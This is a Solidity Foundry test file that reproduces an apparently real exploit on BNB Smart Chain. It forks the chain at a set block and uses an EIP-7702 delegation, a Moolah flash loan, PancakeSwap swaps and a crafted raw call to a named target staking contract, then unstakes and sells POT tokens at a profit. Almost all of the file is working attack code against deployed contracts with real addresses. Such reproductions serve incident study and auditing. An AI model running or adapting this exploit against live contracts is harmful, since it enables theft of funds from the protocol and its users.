// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract ExploitTest is Test {
    address attackerAddr;
    uint256 attackerPrivateKey;
    IERC20 constant BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        (attackerAddr, attackerPrivateKey) = makeAddrAndKey("attacker");
        vm.createSelectFork("bsc", 58775596);
        vm.deal(attackerAddr, 15 ether);
    }

    function testExploit() public {
        vm.startPrank(attackerAddr, attackerAddr);
        console.log("before the attack:");
        emit log_named_decimal_uint("  attacker bnb balance", attackerAddr.balance, 18);
        emit log_named_decimal_uint("  attacker bsc-usd balance", BSC_USD.balanceOf(attackerAddr), 18);

        Exploit exploit = new Exploit();
        vm.signAndAttachDelegation(address(exploit), attackerPrivateKey);
        Exploit(payable(attackerAddr)).exploit{value: 13.9 ether}();

        vm.roll(58775688);
        vm.warp(1756080014);

        Exploit(payable(attackerAddr)).withdraw();

        console.log("after the attack:");
        emit log_named_decimal_uint("  attacker bnb balance", attackerAddr.balance, 18);
        emit log_named_decimal_uint("  attacker bsc-usd balance", BSC_USD.balanceOf(attackerAddr), 18);
        vm.stopPrank();
    }
}

contract Exploit {
    IPancakeSwapRouterV2 constant PANCAKE_SWAP_ROUTER_V2 =
        IPancakeSwapRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant POT = IERC20(0xC14ede79fda7c0b2f70Baa5d070E841c2E13A888);
    IMoolah constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    ITarget constant TARGET = ITarget(0x5a46C6F1f32Bfe012bD3b7170Fbcef1f128474Fa);

    function exploit() external payable {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BSC_USD);
        PANCAKE_SWAP_ROUTER_V2.swapExactETHForTokens{value: msg.value}(0, path, address(this), 1756079946);
        MOOLAH.flashLoan(address(BSC_USD), 3560000000000000000000000, hex"");
    }

    function onMoolahFlashLoan(uint256, /* assets */ bytes memory /* userData */ ) external {
        BSC_USD.approve(address(MOOLAH), type(uint256).max);
        BSC_USD.approve(address(PANCAKE_SWAP_ROUTER_V2), type(uint256).max);
        POT.approve(address(PANCAKE_SWAP_ROUTER_V2), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(BSC_USD);
        path[1] = address(POT);
        PANCAKE_SWAP_ROUTER_V2.swapExactTokensForTokens(3560000000000000000000000, 0, path, address(this), 1756079946);

        POT.approve(address(TARGET), 220048965331693696654580);

        (bool success,) = address(TARGET).call(
            bytes.concat(hex"93649277", hex"000000000000000000000000000000000000000000002e98e0d923ca49771cf4")
        );
        require(success);

        path[0] = address(POT);
        path[1] = address(BSC_USD);

        PANCAKE_SWAP_ROUTER_V2.swapExactTokensForTokens(28550070633924996359654455, 0, path, address(this), 1756079946);
    }

    function withdraw() external {
        POT.approve(address(PANCAKE_SWAP_ROUTER_V2), type(uint256).max);
        BSC_USD.approve(address(PANCAKE_SWAP_ROUTER_V2), type(uint256).max);
        TARGET.unstake();
        uint256 potBalance = POT.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = address(POT);
        path[1] = address(BSC_USD);
        PANCAKE_SWAP_ROUTER_V2.swapExactTokensForTokens(potBalance, 0, path, address(this), 1756080014);
    }
}

interface IPancakeSwapRouterV2 {
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable;
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface ITarget {
    function unstake() external;
}
